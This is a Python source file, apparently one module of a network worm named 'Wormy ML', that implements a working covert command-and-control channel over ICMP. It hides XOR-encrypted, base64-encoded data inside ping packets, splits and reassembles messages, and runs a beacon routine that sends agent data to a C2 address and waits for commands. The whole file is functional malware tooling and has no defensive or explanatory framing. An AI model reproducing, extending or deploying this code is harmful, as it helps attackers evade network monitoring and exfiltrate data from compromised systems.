"""
Wormy ML Network Worm v3.0 - Real ICMP Tunnel C2 Channel
Encapsulates encrypted data inside ICMP Echo Request/Reply payloads.
"""

import base64
import hashlib
import json
import os
import socket
import struct
import sys
import threading
import time
from typing import Dict, List, Optional

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from utils.logger import logger


def _checksum(data: bytes) -> int:
    """Standard ICMP checksum."""
    if len(data) % 2:
        data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) + data[i + 1]
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return ~s & 0xFFFF


def _xor_encrypt(data: bytes, key: bytes) -> bytes:
    k = hashlib.sha256(key).digest()
    return bytes(data[i] ^ k[i % len(k)] for i in range(len(data)))


class ICMPTunnel:
    """
    Real ICMP covert channel using raw sockets.

    Sender side:
      1. Fragment payload into ≤ 1400-byte chunks.
      2. Each chunk → XOR-encrypted → base64 → packed into ICMP Echo payload.
      3. ICMP packet: type=8 id=<session_id> seq=<chunk_index>.

    Receiver side:
      1. Raw socket binds IPPROTO_ICMP, listens for Echo-Reply (type=0).
      2. Reassembles chunks by (session_id, seq).

    Requires root / raw-socket privilege on Linux;
    requires Administrator + WinPcap/Npcap on Windows.
    """

    ICMP_ECHO_REQUEST = 8
    ICMP_ECHO_REPLY = 0
    CHUNK_SIZE = 1400  # bytes of payload per ICMP packet
    PASSPHRASE = b"wormy-icmp-v3"

    def __init__(self, c2_ip: str, session_key: Optional[bytes] = None, identifier: int = None):
        self.c2_ip = c2_ip
        self.key = session_key or self.PASSPHRASE
        self.session_id = identifier or (os.getpid() & 0xFFFF)
        self._sock: Optional[socket.socket] = None
        self._recv_buf: Dict[int, bytes] = {}  # seq -> chunk
        self._lock = threading.Lock()
        self._listener = None
        self._running = False

    # ─── socket management ───────────────────────────────────────────────────

    def _open_socket(self) -> bool:
        try:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            self._sock.settimeout(5)
            return True
        except PermissionError:
            logger.warning("ICMP tunnel requires root/admin privileges — skipping")
            return False
        except Exception as e:
            logger.warning(f"ICMP socket error: {e}")
            return False

    # ─── packet build / parse ─────────────────────────────────────────────────

    def _build_echo(self, seq: int, payload: bytes, icmp_type: int = ICMP_ECHO_REQUEST) -> bytes:
        """Build a raw ICMP Echo packet with the given payload."""
        # ICMP header: type(1) code(1) checksum(2) id(2) seq(2)
        header = struct.pack("!BBHHH", icmp_type, 0, 0, self.session_id & 0xFFFF, seq & 0xFFFF)
        raw = header + payload
        cs = _checksum(raw)
        return (
            struct.pack("!BBHHH", icmp_type, 0, cs, self.session_id & 0xFFFF, seq & 0xFFFF)
            + payload
        )

    def _parse_reply(self, raw_packet: bytes) -> Optional[tuple]:
        """
        Parse raw IP+ICMP packet from recvfrom.
        Returns (icmp_type, identifier, seq, payload) or None.
        """
        try:
            # Skip IP header (first 20 bytes minimum)
            ip_ihl = (raw_packet[0] & 0x0F) * 4
            icmp = raw_packet[ip_ihl:]
            if len(icmp) < 8:
                return None
            icmp_type, _, _, ident, seq = struct.unpack("!BBHHH", icmp[:8])
            payload = icmp[8:]
            return icmp_type, ident, seq, payload
        except Exception:
            return None

    # ─── chunked send ────────────────────────────────────────────────────────

    def _encrypt_chunk(self, data: bytes) -> bytes:
        return base64.b64encode(_xor_encrypt(data, self.key))

    def _decrypt_chunk(self, data: bytes) -> bytes:
        return _xor_encrypt(base64.b64decode(data), self.key)

    def send(self, message: Dict) -> bool:
        """
        Serialize message as JSON, encrypt, fragment into ICMP chunks,
        and send to c2_ip. Returns True if all chunks delivered.
        """
        if not self._sock and not self._open_socket():
            return False

        payload = json.dumps(message).encode()
        chunks = [payload[i : i + self.CHUNK_SIZE] for i in range(0, len(payload), self.CHUNK_SIZE)]
        total = len(chunks)
        logger.info(f"ICMP tunnel: sending {len(payload)} B in {total} chunks")

        # First packet carries metadata: total_chunks in first 4 bytes
        for seq, chunk in enumerate(chunks):
            enc = self._encrypt_chunk(chunk)
            # prepend total_chunks (4B) on first packet
            if seq == 0:
                meta = struct.pack("!I", total) + enc
            else:
                meta = enc
            pkt = self._build_echo(seq, meta)
            try:
                self._sock.sendto(pkt, (self.c2_ip, 0))
                time.sleep(0.05)  # rate limit
            except Exception as e:
                logger.error(f"ICMP send error (seq={seq}): {e}")
                return False

        logger.success(f"ICMP tunnel: sent {total} chunks to {self.c2_ip}")
        return True

    def receive(self, timeout: float = 10.0) -> Optional[Dict]:
        """
        Listen for ICMP Echo Reply packets from c2_ip,
        reassemble chunks, decrypt, and return parsed JSON dict.
        """
        if not self._sock and not self._open_socket():
            return None

        self._sock.settimeout(timeout)
        chunks = {}
        total_exp = None
        deadline = time.time() + timeout

        while time.time() < deadline:
            try:
                raw, addr = self._sock.recvfrom(65535)
                if addr[0] != self.c2_ip:
                    continue
                parsed = self._parse_reply(raw)
                if not parsed:
                    continue
                icmp_type, ident, seq, data = parsed
                if icmp_type != self.ICMP_ECHO_REPLY:
                    continue
                if ident != (self.session_id & 0xFFFF):
                    continue

                # First chunk carries 4-byte total count prefix
                if seq == 0 and len(data) >= 4:
                    total_exp = struct.unpack("!I", data[:4])[0]
                    data = data[4:]

                chunks[seq] = self._decrypt_chunk(data)

                if total_exp and len(chunks) >= total_exp:
                    payload = b"".join(chunks[i] for i in sorted(chunks))
                    return json.loads(payload.decode())

            except socket.timeout:
                break
            except Exception as e:
                logger.debug(f"ICMP recv error: {e}")
                break

        return None

    # ─── beacon helper ───────────────────────────────────────────────────────

    def beacon(self, agent_data: Dict) -> Optional[Dict]:
        """Send a beacon and wait for a command reply."""
        if self.send({"type": "beacon", "data": agent_data}):
            return self.receive(timeout=8.0)
        return None

    def start_listener(self, callback):
        """
        Start a background thread that listens for ICMP and calls
        callback(message_dict) for each complete reassembled message.
        """

        def _listen():
            if not self._open_socket():
                return
            while self._running:
                msg = self.receive(timeout=2.0)
                if msg:
                    callback(msg)

        self._running = True
        self._listener = threading.Thread(target=_listen, daemon=True)
        self._listener.start()
        logger.info(f"ICMP listener started (session_id={self.session_id})")

    def stop(self):
        self._running = False
        if self._sock:
            try:
                self._sock.close()
            except Exception:
                pass

    def get_status(self) -> Dict:
        return {
            "c2_ip": self.c2_ip,
            "session_id": self.session_id,
            "chunk_size": self.CHUNK_SIZE,
            "socket_open": self._sock is not None,
        }
